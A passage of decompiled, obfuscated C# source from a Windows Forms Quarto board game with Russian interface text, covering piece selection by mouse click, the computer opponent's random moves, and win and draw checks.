					flag3 = (byte)num9 != 0;
					num = 1369286971;
					continue;
				}
				break;
			}
		}
	}

	private void PictureBox1_MouseDown(object sender, MouseEventArgs e)
	{
		//IL_00e5: Unknown result type (might be due to invalid IL or missing references)
		//IL_00fb: Expected O, but got Unknown
		int num5 = default(int);
		Graphics graphics_ = default(Graphics);
		int num8 = default(int);
		int num3 = default(int);
		int num4 = default(int);
		bool flag2 = default(bool);
		bool flag3 = default(bool);
		bool flag = default(bool);
		while (true)
		{
			int num = 703177962;
			while (true)
			{
				uint num2;
				int num9;
				switch ((num2 = (uint)num ^ 0x2D2E3C8Cu) % 30u)
				{
				case 28u:
					Form1.smethod_7((Control)(object)button2, bool_0: true);
					num = ((int)num2 * -404496759) ^ 0x514BBDC9;
					continue;
				case 27u:
					num5 = 0;
					num = 987231942;
					continue;
				case 26u:
					Form1.smethod_45(graphics_);
					num = (int)(num2 * 1449746879) ^ -554523985;
					continue;
				case 25u:
					num = ((int)num2 * -676432149) ^ 0x52245AA3;
					continue;
				case 24u:
					Paint_Board();
					num = (int)(num2 * 1706371938) ^ -1091601683;
					continue;
				case 23u:
					num = ((int)num2 * -805489408) ^ 0x50C4423B;
					continue;
				case 22u:
					num8 = Form1.smethod_38(e) / size;
					num = (int)((num2 * 988837544) ^ 0x56BDB4C8);
					continue;
				case 21u:
					if (board[num3, num8] == null)
					{
						num = 1956878062;
						num9 = 1956878062;
						continue;
					}
					goto IL_00ca;
				case 20u:
					if (Form1.smethod_40((Bitmap)Form1.smethod_21(pictureBox1), Form1.smethod_38(e), Form1.smethod_39(e)) != Color.FromArgb(0, 0, 0, 0))
					{
						num = ((int)num2 * -1695427652) ^ 0x13D6AA0F;
						continue;
					}
					goto IL_00ca;
				case 19u:
					num5++;
					num = 987231942;
					continue;
				case 18u:
					num4 = 0;
					num = (int)((num2 * 1650240316) ^ 0x6ABB26C7);
					continue;
				case 17u:
					num = (int)(num2 * 186597125) ^ -575798870;
					continue;
				case 16u:
				{
					int num12;
					int num13;
					if (flag2)
					{
						num12 = -184760407;
						num13 = -184760407;
					}
					else
					{
						num12 = -647107888;
						num13 = -647107888;
					}
					num = num12 ^ ((int)num2 * -1206036065);
					continue;
				}
				case 15u:
					Form1.smethod_30((Control)(object)pictureBox1);
					num = ((int)num2 * -2126071530) ^ -1697233609;
					continue;
				case 14u:
				{
					int num10;
					int num11;
					if (!flag3)
					{
						num10 = -68046523;
						num11 = -68046523;
					}
					else
					{
						num10 = -774656852;
						num11 = -774656852;
					}
					num = num10 ^ ((int)num2 * -1518875138);
					continue;
				}
				case 13u:
					graphics_ = Form1.smethod_22(Form1.smethod_21(pictureBox1));
					Form1.smethod_43(graphics_, Form1.smethod_42(Color.Red, 3f), ((float)num8 + 0.05f) * (float)size, ((float)num3 + 0.05f) * (float)size, (float)size * 0.9f, (float)size * 0.9f);
					num = (int)((num2 * 1317282762) ^ 0x79245487);
					continue;
				case 12u:
					num = (int)(num2 * 1655964383) ^ -1423388888;
					continue;
				case 11u:
					Form1.smethod_44(graphics_, Form1.smethod_21(pictureBox[num4, num5]), num8 * size + 4, num3 * size + 4, new Rectangle(0, 0, size, size), (GraphicsUnit)2);
					num = (int)(num2 * 1321713161) ^ -1216088731;
					continue;
				case 10u:
				{
					int num6;
					int num7;
					if (!flag)
					{
						num6 = -1259713541;
						num7 = -1259713541;
					}
					else
					{
						num6 = -365121729;
						num7 = -365121729;
					}
					num = num6 ^ ((int)num2 * -2050255887);
					continue;
				}
				case 9u:
					flag3 = Form1.smethod_41((Control)(object)borderBox[num4, num5]) == Color.Blue;
					num = 107791966;
					continue;
				case 8u:
					flag2 = num5 < 4;
					num = 511143446;
					continue;
				case 7u:
					num = (int)((num2 * 1455341141) ^ 0x6F922998);
					continue;
				case 5u:
					num = ((int)num2 * -1688517412) ^ 0x4A663D63;
					continue;
				case 4u:
					num4++;
					num = ((int)num2 * -256737729) ^ 0x63F70274;
					continue;
				case 3u:
					num = ((int)num2 * -358260120) ^ -1699354444;
					continue;
				case 2u:
					flag = num4 < 4;
					num = 1540337936;
					continue;
				case 1u:
					Form1.smethod_32((Control)(object)richTextBox1, "Уверены? Для выполнения данного хода нажмите \"Подтвердить\".");
					num = (int)(num2 * 370827879) ^ -1989274788;
					continue;
				case 0u:
					num3 = Form1.smethod_39(e) / size;
					num = ((int)num2 * -2062367989) ^ 0x25A7B530;
					continue;
				default:
					return;
				case 6u:
					break;
				case 29u:
					return;
					IL_00ca:
					num = 1907402791;
					num9 = 1907402791;
					continue;
				}
				break;
			}
		}
	}

	private void Button2_Click(object sender, EventArgs e)
	{
		//IL_00d2: Unknown result type (might be due to invalid IL or missing references)
		//IL_0100: Expected O, but got Unknown
		Graphics graphics_ = default(Graphics);
		int num6 = default(int);
		int num5 = default(int);
		int num17 = default(int);
		int num16 = default(int);
		int num21 = default(int);
		int num22 = default(int);
		bool flag11 = default(bool);
		int num3 = default(int);
		int num7 = default(int);
		int num8 = default(int);
		int num32 = default(int);
		int num33 = default(int);
		bool flag5 = default(bool);
		int num50 = default(int);
		int num39 = default(int);
		int num34 = default(int);
		int num35 = default(int);
		int num10 = default(int);
		int num13 = default(int);
		bool flag7 = default(bool);
		bool flag8 = default(bool);
		int num19 = default(int);
		bool flag6 = default(bool);
		int num18 = default(int);
		bool flag4 = default(bool);
		bool flag2 = default(bool);
		bool flag10 = default(bool);
		Figurine[,] array3 = default(Figurine[,]);
		bool flag9 = default(bool);
		int num44 = default(int);
		int num4 = default(int);
		bool flag3 = default(bool);
		Figurine[,] array2 = default(Figurine[,]);
		Figurine[,] array = default(Figurine[,]);
		bool flag = default(bool);
		while (true)
		{
			int num = -881132911;
			while (true)
			{
				uint num2;
				int num23;
				int num45;
				int num9;
				int num38;
				switch ((num2 = (uint)num ^ 0xF6E07573u) % 176u)
				{
				case 175u:
					num = (int)(num2 * 1054512594) ^ -1137836230;
					continue;
				case 174u:
					num = ((int)num2 * -1352661294) ^ -1211730653;
					continue;
				case 173u:
					num = (int)(num2 * 1904935347) ^ -5370836;
					continue;
				case 172u:
					Form1.smethod_43(graphics_, Form1.smethod_42(Color.LimeGreen, 3f), ((float)num6 + 0.05f) * (float)size, ((float)num5 + 0.05f) * (float)size, (float)size * 0.9f, (float)size * 0.9f);
					num = ((int)num2 * -2075350928) ^ 0x4704B407;
					continue;
				case 171u:
					Form1.smethod_32((Control)(object)richTextBox1, "Ничья!");
					num = ((int)num2 * -1511584702) ^ 0x47F5DADE;
					continue;
				case 170u:
				{
					int num31;
					if (!(Form1.smethod_40((Bitmap)Form1.smethod_21(pictureBox1), num17 * size + size / 2, (int)(((float)num16 + 0.05f) * (float)size)) == Color.FromArgb(255, 255, 0, 0)))
					{
						num = -264460525;
						num31 = -264460525;
					}
					else
					{
						num = -333477045;
						num31 = -333477045;
					}
					continue;
				}
				case 169u:
					if (storage[num21, num22] != null)
					{
						num = (int)((num2 * 967186778) ^ 0x2AC7528F);
						continue;
					}
					goto IL_015b;
				case 168u:
					num = -1452068199;
					continue;
				case 167u:
				{
					int num63;
					int num64;
					if (!flag11)
					{
						num63 = 1850366323;
						num64 = 1850366323;
					}
					else
					{
						num63 = 1153508474;
						num64 = 1153508474;
					}
					num = num63 ^ ((int)num2 * -1911988005);
					continue;
				}
				case 166u:
					Form1.smethod_32((Control)(object)richTextBox1, "Ничья!");
					num = ((int)num2 * -1762962912) ^ 0x5941053F;
					continue;
				case 165u:
					num = ((int)num2 * -99177204) ^ -832451607;
					continue;
				case 164u:
					num3 = 0;
					num = ((int)num2 * -523885482) ^ 0x2B7A77D9;
					continue;
				case 163u:
					Form1.smethod_30((Control)(object)borderBox[num21, num22]);
					Form1.smethod_32((Control)(object)richTextBox1, "Противник сделал ход (зелёный). Выберете поле на доске для выбронной противником фигуры (синий).");
					num = (int)((num2 * 1049858417) ^ 0xCFCBA43);
					continue;
				case 162u:
					num16++;
					num = (int)(num2 * 712147663) ^ -1291755255;
					continue;
				case 161u:
					num = ((int)num2 * -1805214471) ^ -2019578433;
					continue;
				case 160u:
					Form1.smethod_44(graphics_, Form1.smethod_21(pictureBox[num7, num8]), num32 * size + 4, num33 * size + 4, new Rectangle(0, 0, size, size), (GraphicsUnit)2);
					Form1.smethod_30((Control)(object)pictureBox1);
					num = ((int)num2 * -1035006186) ^ -132010958;
					continue;
				case 159u:
					flag5 = num3 < 4;
					num = -1949000389;
					continue;
				case 158u:
					num33 = Form1.smethod_33(rnd, 4);
					num = -1863335888;
					continue;
				case 157u:
					board[num50, num39] = new Figurine(storage[num34, num35]);
					storage[num34, num35] = null;
					num = (int)((num2 * 1708442542) ^ 0x106959C1);
					continue;
				case 156u:
					num = ((int)num2 * -906544001) ^ 0x9845431;
					continue;
				case 155u:
					num = (int)(num2 * 1528567852) ^ -531944284;
					continue;
				case 154u:
					num = ((int)num2 * -1215837428) ^ -663346843;
					continue;
				case 153u:
					Form1.smethod_5((Control)(object)borderBox[num10, num13], Color.LimeGreen);
					num = (int)(num2 * 1104219716) ^ -1627931016;
					continue;
				case 152u:
					num = ((int)num2 * -1194441874) ^ -1496170401;
					continue;
				case 151u:
					num = (int)((num2 * 633088327) ^ 0x4E666494);
					continue;
				case 150u:
					board[num5, num6] = new Figurine(storage[num7, num8]);
					num = (int)(num2 * 1596349946) ^ -101498052;
					continue;
				case 149u:
					num6++;
					num = -871005506;
					continue;
				case 148u:
					num = ((int)num2 * -807152070) ^ -560016641;
					continue;
				case 147u:
					storage[num7, num8] = null;
					num = ((int)num2 * -1817450114) ^ 0x6A11EBD1;
					continue;
				case 146u:
					Form1.smethod_7((Control)(object)button2, bool_0: false);
					num = ((int)num2 * -267350734) ^ -726638291;
					continue;
				case 145u:
					Form1.smethod_47(1000);
					num = ((int)num2 * -1254540184) ^ 0xEBAA9E4;
					continue;
				case 144u:
					Form1.smethod_30((Control)(object)borderBox[num7, num8]);
					num = (int)(num2 * 1321624049) ^ -102511836;
					continue;
				case 143u:
					num = ((int)num2 * -498621895) ^ -686844163;
					continue;
				case 142u:
					num39 = 0;
					num16 = 0;
					num = (int)(num2 * 964646019) ^ -721207039;
					continue;
				case 141u:
					flag7 = num6 < 4;
					num = -339873471;
					continue;
				case 140u:
					num = -743056323;
					continue;
				case 139u:
					num = ((int)num2 * -1648522999) ^ 0xC00FBBD;
					continue;
				case 138u:
					num = ((int)num2 * -1383343159) ^ 0x45AFBC3F;
					continue;
				case 137u:
					num = ((int)num2 * -883601903) ^ -1198830150;
					continue;
				case 136u:
					Form1.smethod_30((Control)(object)borderBox[num10, num13]);
					num = (int)((num2 * 536248957) ^ 0x6B2BFE41);
					continue;
				case 135u:
					step++;
					Form1.smethod_32((Control)(object)label2, Form1.smethod_34("Ход: ", step.ToString()));
					num = (int)(num2 * 440445739) ^ -2056998788;
					continue;
				case 134u:
					num34 = 0;
					num = (int)(num2 * 721385577) ^ -672517150;
					continue;
				case 133u:
					flag8 = num10 < 4;
					num = -468559830;
					continue;
				case 132u:
					num = -1016811803;
					continue;
				case 131u:
					num39 = num17;
					num = ((int)num2 * -1667575063) ^ 0x1817FC70;
					continue;
				case 130u:
				{
					int num29;
					int num30;
					if (flag7)
					{
						num29 = 2042831277;
						num30 = 2042831277;
					}
					else
					{
						num29 = 49523115;
						num30 = 49523115;
					}
					num = num29 ^ (int)(num2 * 692360685);
					continue;
				}
				case 129u:
					num19++;
					num = -1218366858;
					continue;
				case 128u:
					num = ((int)num2 * -117527988) ^ -2091861141;
					continue;
				case 127u:
					Form1.smethod_32((Control)(object)richTextBox1, "Выберете фигуру, которой будет играть противник.");
					num = ((int)num2 * -1879930221) ^ -1804824085;
					continue;
				case 126u:
					flag6 = num18 < 4;
					num = -1086252539;
					continue;
				case 125u:
					flag4 = num17 < 4;
					num = -1909246584;
					continue;
				case 124u:
				{
					int num14;
					int num15;
					if (!(Form1.smethod_41((Control)(object)borderBox[num10, num13]) == Color.Red))
					{
						num14 = 1339894535;
						num15 = 1339894535;
					}
					else
					{
						num14 = 1297572326;
						num15 = 1297572326;
					}
					num = num14 ^ (int)(num2 * 1882298305);
					continue;
				}
				case 123u:
					num7 = 0;
					num = ((int)num2 * -755489446) ^ 0x562DE396;
					continue;
				case 122u:
					num13++;
					num = (int)((num2 * 1797171253) ^ 0x57DE94FD);
					continue;
				case 121u:
					num10++;
					num = ((int)num2 * -1669603665) ^ 0x45D70601;
					continue;
				case 120u:
					num = ((int)num2 * -1838216256) ^ 0x176B6777;
					continue;
				case 119u:
					Form1.smethod_30((Control)(object)borderBox[num16, num17]);
					num = ((int)num2 * -1104117864) ^ -1739406330;
					continue;
				case 118u:
					if (num21 == num7)
					{
						num = (int)(num2 * 520981078) ^ -169932152;
						continue;
					}
					goto IL_0167;
				case 117u:
					Form1.smethod_32((Control)(object)richTextBox1, "Подождите, компьютер делает свой ход.");
					num = (int)((num2 * 1837603482) ^ 0x6789C63);
					continue;
				case 116u:
				{
					int num65;
					if (num16 < 4)
					{
						num = -1743216993;
						num65 = -1743216993;
					}
					else
					{
						num = -1325767026;
						num65 = -1325767026;
					}
					continue;
				}
				case 115u:
					num = ((int)num2 * -1396532189) ^ 0x475AAB34;
					continue;
				case 114u:
					num = ((int)num2 * -687231965) ^ -1313723733;
					continue;
				case 113u:
					flag2 = true;
					num = ((int)num2 * -2088920274) ^ -448189482;
					continue;
				case 112u:
					num = ((int)num2 * -1201120271) ^ 0x6BD99456;
					continue;
				case 111u:
					if (num22 == num8)
					{
						goto IL_015b;
					}
					goto IL_0167;
				case 110u:
					if (!Stop(board))
					{
						num = (int)((num2 * 872092187) ^ 0x4AF7C91D);
						continue;
					}
					num23 = 0;
					goto IL_07f8;
				case 109u:
					Form1.smethod_30((Control)(object)pictureBox[num7, num8]);
					num = (int)(num2 * 2132172822) ^ -1465948591;
					continue;
				case 108u:
					num50 = num16;
					num = (int)((num2 * 401440880) ^ 0xD230270);
					continue;
				case 107u:
				{
					int num61;
					int num62;
					if (!flag10)
					{
						num61 = -156504274;
						num62 = -156504274;
					}
					else
					{
						num61 = -1992941638;
						num62 = -1992941638;
					}
					num = num61 ^ (int)(num2 * 1191543669);
					continue;
				}
				case 106u:
					num = ((int)num2 * -7300183) ^ 0x416AE4BA;
					continue;
				case 105u:
				{
					int num59;
					int num60;
					if (!flag8)
					{
						num59 = 1834196335;
						num60 = 1834196335;
					}
					else
					{
						num59 = 312894158;
						num60 = 312894158;
					}
					num = num59 ^ (int)(num2 * 439648165);
					continue;
				}
				case 104u:
					num3++;
					num = (int)(num2 * 478319915) ^ -2049270444;
					continue;
				case 103u:
					num = ((int)num2 * -2066790996) ^ 0x17E758FF;
					continue;
				case 102u:
					if (!flag2)
					{
						num = (int)((num2 * 978389332) ^ 0x51ED7EF5);
						continue;
					}
					num45 = 1;
					goto IL_08ea;
				case 101u:
					num8 = num13;
					num = ((int)num2 * -2120790574) ^ -1397918274;
					continue;
				case 100u:
				{
					int num58;
					if (board[num5, num6] == null)
					{
						num = -704443998;
						num58 = -704443998;
					}
					else
					{
						num = -870327178;
						num58 = -870327178;
					}
					continue;
				}
				case 99u:
					Form1.smethod_15(timer1);
					(menu as Form3).ContinueLock();
					num = -439649883;
					continue;
				case 98u:
					num = ((int)num2 * -929257916) ^ 0x5FED330A;
					continue;
				case 97u:
				{
					int num56;
					int num57;
					if (!Stop(array3))
					{
						num56 = 215726976;
						num57 = 215726976;
					}
					else
					{
						num56 = 1767308666;
						num57 = 1767308666;
					}
					num = num56 ^ ((int)num2 * -1779535784);
					continue;
				}
				case 96u:
					num = -607064072;
					continue;
				case 95u:
				{
					int num54;
					int num55;
					if (flag9)
					{
						num54 = -1319403151;
						num55 = -1319403151;
					}
					else
					{
						num54 = -321953478;
						num55 = -321953478;
					}
					num = num54 ^ (int)(num2 * 668899323);
					continue;
				}
				case 94u:
					num = -1674402531;
					continue;
				case 93u:
				{
					int num53;
					if (num5 < 4)
					{
						num = -1951223259;
						num53 = -1951223259;
					}
					else
					{
						num = -764090167;
						num53 = -764090167;
					}
					continue;
				}
				case 92u:
					(menu as Form3).ContinueLock();
					num = ((int)num2 * -500524371) ^ -622265115;
					continue;
				case 91u:
					num = -1760045022;
					continue;
				case 90u:
					num44 = 0;
					num = ((int)num2 * -1769081779) ^ 0x6E8CBD2F;
					continue;
				case 89u:
					Form1.smethod_7((Control)(object)pictureBox1, bool_0: false);
					num = (int)((num2 * 188074258) ^ 0x62B773DD);
					continue;
				case 88u:
				{
					int num51;
					int num52;
					if (Standoff(board))
					{
						num51 = 2016803008;
						num52 = 2016803008;
					}
					else
					{
						num51 = 501771136;
						num52 = 501771136;
					}
					num = num51 ^ ((int)num2 * -7821139);
					continue;
				}
				case 87u:
					num35 = 0;
					num50 = 0;
					num = (int)((num2 * 751184474) ^ 0x573465EB);
					continue;
				case 86u:
				{
					int num48;
					int num49;
					if (board[num33, num32] == null)
					{
						num48 = -520443755;
						num49 = -520443755;
					}
					else
					{
						num48 = -2075354833;
						num49 = -2075354833;
					}
					num = num48 ^ ((int)num2 * -1130708717);
					continue;
				}
				case 85u:
					num4 = 0;
					num = -267005853;
					continue;
				case 84u:
					num44++;
					num = (int)((num2 * 808492990) ^ 0x45B439D2);
					continue;
				case 83u:
					Form1.smethod_5((Control)(object)borderBox[num7, num8], Color.White);
					num = (int)(num2 * 1744076515) ^ -1356721805;
					continue;
				case 82u:
				{
					int num46;
					int num47;
					if (!flag3)
					{
						num46 = -1450189461;
						num47 = -1450189461;
					}
					else
					{
						num46 = -1794330636;
						num47 = -1794330636;
					}
					num = num46 ^ ((int)num2 * -1773235087);
					continue;
				}
				case 81u:
					Form1.smethod_47(200);
					num = ((int)num2 * -1527856410) ^ 0x44BE5D76;
					continue;
				case 80u:
					array2 = (Figurine[,])Form1.smethod_48((Array)board);
					num = (int)((num2 * 1848453920) ^ 0x1E7C8883);
					continue;
				case 79u:
					num = ((int)num2 * -1150840826) ^ -2051573033;
					continue;
				case 78u:
					num45 = ((num44 < 9) ? 1 : 0);
					goto IL_08ea;
				case 77u:
					flag9 = Standoff(board);
					num = -774938548;
					continue;
				case 76u:
				{
					int num43;
					if (num13 >= 4)
					{
						num = -231731462;
						num43 = -231731462;
					}
					else
					{
						num = -1446817560;
						num43 = -1446817560;
					}
					continue;
				}
				case 75u:
					num8 = 0;
					num = (int)(num2 * 555007011) ^ -120533816;
					continue;
				case 74u:
					num10 = 0;
					num = (int)(num2 * 857608886) ^ -958826849;
					continue;
				case 73u:
					Form1.smethod_30((Control)(object)borderBox[num7, num8]);
					num = ((int)num2 * -1964722053) ^ -20763539;
					continue;
				case 72u:
				{
					int num42;
					if (num4 < 4)
					{
						num = -1664651053;
						num42 = -1664651053;
					}
					else
					{
						num = -538433525;
						num42 = -538433525;
					}
					continue;
				}
				case 71u:
					num = (int)((num2 * 232032829) ^ 0x34EECCC9);
					continue;
				case 70u:
					Form1.smethod_5((Control)(object)borderBox[num21, num22], Color.Blue);
					num = ((int)num2 * -858265082) ^ 0x59503554;
					continue;
				case 69u:
					num = (int)((num2 * 413780427) ^ 0x30650CCA);
					continue;
				case 68u:
					Form1.smethod_44(graphics_, Form1.smethod_21(pictureBox[num7, num8]), num6 * size + 4, num5 * size + 4, new Rectangle(0, 0, size, size), (GraphicsUnit)2);
					num = ((int)num2 * -1642249558) ^ -1649473129;
					continue;
				case 67u:
					num32 = Form1.smethod_33(rnd, 4);
					num = (int)((num2 * 1427874112) ^ 0x5DBE6739);
					continue;
				case 66u:
					num = ((int)num2 * -1332550449) ^ -2118159086;
					continue;
				case 65u:
					num = (int)(num2 * 608561471) ^ -1927937205;
					continue;
				case 64u:
					board[num33, num32] = new Figurine(storage[num7, num8]);
					storage[num7, num8] = null;
					num = (int)((num2 * 1516009095) ^ 0x6DB656A5);
					continue;
				case 63u:
					Form1.smethod_30((Control)(object)pictureBox[num7, num8]);
					num = ((int)num2 * -258445276) ^ 0x2B9453E6;
					continue;
				case 62u:
					Form1.smethod_47(200);
					num = ((int)num2 * -2004105646) ^ 0x6D1050B6;
					continue;
				case 61u:
					num = -870327178;
					continue;
				case 60u:
					num17 = 0;
					num = -994328168;
					continue;
				case 59u:
					num17++;
					num = (int)(num2 * 1664760645) ^ -1547742071;
					continue;
				case 58u:
				{
					int num40;
					int num41;
					if (Form1.smethod_46((Control)(object)pictureBox1))
					{
						num40 = -396479034;
						num41 = -396479034;
					}
					else
					{
						num40 = -582782281;
						num41 = -582782281;
					}
					num = num40 ^ ((int)num2 * -1090794026);
					continue;
				}
				case 56u:
					num = ((int)num2 * -1969460922) ^ 0x73DC8C3;
					continue;
				case 55u:
					num = ((int)num2 * -891173626) ^ -1360073284;
					continue;
				case 54u:
				{
					int num36;
					int num37;
					if (!flag6)
					{
						num36 = -764101128;
						num37 = -764101128;
					}
					else
					{
						num36 = -61168596;
						num37 = -61168596;
					}
					num = num36 ^ (int)(num2 * 1309384181);
					continue;
				}
				case 53u:
					num34 = num16;
					num35 = num17;
					Form1.smethod_5((Control)(object)borderBox[num16, num17], Color.White);
					num = ((int)num2 * -1602559844) ^ 0x36C00828;
					continue;
				case 52u:
					num = ((int)num2 * -1101170649) ^ -596375949;
					continue;
				case 51u:
					Form1.smethod_7((Control)(object)pictureBox1, bool_0: true);
					num = (int)((num2 * 1872058935) ^ 0x683BDDE7);
					continue;
				case 50u:
					num18++;
					num = ((int)num2 * -1103532445) ^ 0x6DE1748B;
					continue;
				case 49u:
					num19 = 0;
					num = -482229756;
					continue;
				case 48u:
					array2[num33, num32] = new Figurine(storage[num7, num8]);
					num = ((int)num2 * -1710810140) ^ 0x4CBA14A7;
					continue;
				case 47u:
					graphics_ = Form1.smethod_22(Form1.smethod_21(pictureBox1));
					num5 = 0;
					num = ((int)num2 * -2030992348) ^ 0x4F60A142;
					continue;
				case 46u:
					num = -956409433;
					continue;
				case 45u:
					Form1.smethod_30((Control)(object)pictureBox1);
					num = ((int)num2 * -5466307) ^ 0x554A6A64;
					continue;
				case 44u:
					num = ((int)num2 * -1153165385) ^ -1323816431;
					continue;
				case 43u:
					Form1.smethod_32((Control)(object)richTextBox1, "QUARTO! Компьютер выиграл!");
					num = -1908854656;
					continue;
				case 42u:
					Form1.smethod_43(graphics_, Form1.smethod_42(Color.LimeGreen, 3f), ((float)num32 + 0.05f) * (float)size, ((float)num33 + 0.05f) * (float)size, (float)size * 0.9f, (float)size * 0.9f);
					num = ((int)num2 * -196307864) ^ -1445369309;
					continue;
				case 41u:
					Form1.smethod_5((Control)(object)borderBox[num7, num8], Color.White);
					num = ((int)num2 * -1359765842) ^ -901402323;
					continue;
				case 40u:
					step++;
					num = -409523532;
					continue;
				case 39u:
					Form1.smethod_30((Control)(object)label2);
					num = ((int)num2 * -1869727456) ^ -749282270;
					continue;
				case 38u:
					num21 = Form1.smethod_33(rnd, 4);
					num22 = Form1.smethod_33(rnd, 4);
					num = (int)((num2 * 9556545) ^ 0x4F3A057A);
					continue;
				case 37u:
					num4++;
					num = (int)((num2 * 318856539) ^ 0xAE6BBCC);
					continue;
				case 36u:
					num18 = 0;
					num = (int)((num2 * 476746379) ^ 0x4FC4132C);
					continue;
				case 35u:
					array3 = (Figurine[,])Form1.smethod_48((Array)array2);
					array3[num18, num19] = new Figurine(storage[num21, num22]);
					num = ((int)num2 * -392441029) ^ 0x4427CD83;
					continue;
				case 34u:
					num5++;
					num = ((int)num2 * -1030080989) ^ -343508632;
					continue;
				case 33u:
					Form1.smethod_30((Control)(object)richTextBox1);
					num = (int)(num2 * 931725382) ^ -1768112370;
					continue;
				case 32u:
					num13 = 0;
					num = -1637344553;
					continue;
				case 31u:
					num = ((int)num2 * -213288728) ^ 0x1F7BD5B3;
					continue;
				case 29u:
					Form1.smethod_30((Control)(object)pictureBox[num16, num17]);
					num = (int)(num2 * 1176021035) ^ -957676602;
					continue;
				case 28u:
					num = ((int)num2 * -319038831) ^ 0x3F019DAC;
					continue;
				case 27u:
				{
					int num27;
					int num28;
					if (!flag4)
					{
						num27 = 689693632;
						num28 = 689693632;
					}
					else
					{
						num27 = 2057435026;
						num28 = 2057435026;
					}
					num = num27 ^ (int)(num2 * 493487587);
					continue;
				}
				case 26u:
					num = (int)(num2 * 230865233) ^ -356397036;
					continue;
				case 25u:
					num9 = (Standoff(array) ? 1 : 0);
					goto IL_1214;
				case 24u:
				{
					int num25;
					int num26;
					if (!flag5)
					{
						num25 = 1915236076;
						num26 = 1915236076;
					}
					else
					{
						num25 = 864537830;
						num26 = 864537830;
					}
					num = num25 ^ (int)(num2 * 2134519842);
					continue;
				}
				case 23u:
					Form1.smethod_32((Control)(object)label2, Form1.smethod_34("Ход: ", step.ToString()));
					num = (int)((num2 * 704102559) ^ 0x3BDE04D5);
					continue;
				case 22u:
					num6 = 0;
					num = -1517672199;
					continue;
				case 21u:
				{
					int num24;
					if (num19 < 4)
					{
						num = -2044894228;
						num24 = -2044894228;
					}
					else
					{
						num = -1365627375;
						num24 = -1365627375;
					}
					continue;
				}
				case 20u:
					num23 = ((!Standoff(board)) ? 1 : 0);
					goto IL_07f8;
				case 19u:
					num = (int)((num2 * 2129688167) ^ 0x415D04D8);
					continue;
				case 18u:
					Form1.smethod_7((Control)(object)pictureBox[num10, num13], bool_0: false);
					num = ((int)num2 * -465633911) ^ 0x3B3BE6EF;
					continue;
				case 17u:
					Form1.smethod_20(pictureBox[num7, num8], (Image)null);
					num = (int)((num2 * 181956839) ^ 0x16D5E8E6);
					continue;
				case 16u:
					flag3 = Form1.smethod_41((Control)(object)borderBox[num16, num17]) == Color.Blue;
					num = -643530575;
					continue;
				case 15u:
				{
					int num20;
					if (array2[num18, num19] != null)
					{
						num = -1760045022;
						num20 = -1760045022;
					}
					else
					{
						num = -224769216;
						num20 = -224769216;
					}
					continue;
				}
				case 14u:
					num = ((int)num2 * -1480462195) ^ 0x18B54C9F;
					continue;
				case 13u:
					Form1.smethod_20(pictureBox[num16, num17], (Image)null);
					num = (int)((num2 * 862979861) ^ 0x7EBE301F);
					continue;
				case 12u:
					num = (int)(num2 * 1937372409) ^ -99341870;
					continue;
				case 11u:
					num = -523437791;
					continue;
				case 10u:
					num7 = num10;
					num = (int)(num2 * 58483546) ^ -427395326;
					continue;
				case 9u:
					flag2 = false;
					num = ((int)num2 * -488834023) ^ -1045281316;
					continue;
				case 8u:
					Form1.smethod_20(pictureBox[num7, num8], (Image)null);
					num = ((int)num2 * -1836201870) ^ 0x5F79AABC;
					continue;
				case 7u:
				{
					int num11;
					int num12;
					if (flag)
					{
						num11 = 577983771;
						num12 = 577983771;
					}
					else
					{
						num11 = 1983924858;
						num12 = 1983924858;
					}
					num = num11 ^ ((int)num2 * -1346267028);
					continue;
				}
				case 6u:
					num = ((int)num2 * -873230154) ^ 0x24C72539;
					continue;
				case 5u:
					array[num5, num6] = new Figurine(storage[num7, num8]);
					if (!Stop(array))
					{
						num = (int)((num2 * 385158125) ^ 0x522A3FB);
						continue;
					}
					num9 = 1;
					goto IL_1214;
				case 4u:
					Paint_Board();
					num = ((int)num2 * -1790415394) ^ 0x3AE0B744;
					continue;
				case 3u:
					Form1.smethod_15(timer1);
					num = (int)(num2 * 571062250) ^ -1356395759;
					continue;
				case 2u:
					num = (int)((num2 * 275050470) ^ 0x201F6DC2);
					continue;
				case 1u:
					array = (Figurine[,])Form1.smethod_48((Array)board);
					num = ((int)num2 * -124206827) ^ 0x47FF19E3;
					continue;
				case 0u:
					Form1.smethod_7((Control)(object)pictureBox[num3, num4], bool_0: true);
					num = -938881130;
					continue;
				default:
					return;
				case 57u:
					break;
				case 30u:
					return;
					IL_1214:
					flag = (byte)num9 != 0;
					num = -125421132;
					continue;
					IL_015b:
					num = -2106335945;
					num38 = -2106335945;
					continue;
					IL_08ea:
					flag10 = (byte)num45 != 0;
					num = -1564048488;
					continue;
					IL_07f8:
					flag11 = (byte)num23 != 0;
					num = -1019478460;
					continue;
					IL_0167:
					num = -845766685;
					num38 = -845766685;
					continue;
				}
				break;
			}
		}
	}

	private bool Stop(Figurine[,] mem)
	{
		bool flag4 = default(bool);
		int num5 = default(int);
		bool flag = default(bool);
		bool flag3 = default(bool);
		bool result = default(bool);
		bool flag2 = default(bool);
		while (true)
		{
			int num = 2053230863;
			while (true)
			{
				uint num2;
				int num21;
				int num19;
				switch ((num2 = (uint)num ^ 0x71025971u) % 78u)
				{
				case 77u:
				{
					int num72;
					int num73;
					if (!flag4)
					{
						num72 = 972261996;
						num73 = 972261996;
					}
					else
					{
						num72 = 850316474;
						num73 = 850316474;
					}
					num = num72 ^ ((int)num2 * -1417676737);
					continue;
				}
				case 76u:
				{
					int num6;
					int num7;
					if (mem[num5, 3] != null)
					{
						num6 = 530385525;
						num7 = 530385525;
					}
					else
					{
						num6 = 1498593287;
						num7 = 1498593287;
					}
					num = num6 ^ (int)(num2 * 1366249011);
					continue;
				}
				case 75u:
				{
					int num70;
					if (mem[0, 0].Square == mem[1, 1].Square)
					{
						num = 1669831151;
						num70 = 1669831151;
					}
					else
					{
						num = 1096656328;
						num70 = 1096656328;
					}
					continue;
				}
				case 74u:
				{
					int num36;
					int num37;
					if (mem[1, 1] == null)
					{
						num36 = 2103098888;
						num37 = 2103098888;
					}
					else
					{
						num36 = 989487380;
						num37 = 989487380;
					}
					num = num36 ^ ((int)num2 * -386946320);
					continue;
				}
				case 73u:
				{
					int num52;
					int num53;
					if (mem[num5, 0] != null)
					{
						num52 = 1981608034;
						num53 = 1981608034;
					}
					else
					{
						num52 = 498269288;
						num53 = 498269288;
					}
					num = num52 ^ (int)(num2 * 780601753);
					continue;
				}
				case 72u:
					flag = false;
					num = (int)(num2 * 1605781974) ^ -1852117482;
					continue;
				case 71u:
					if (mem[1, num5] != null)
					{
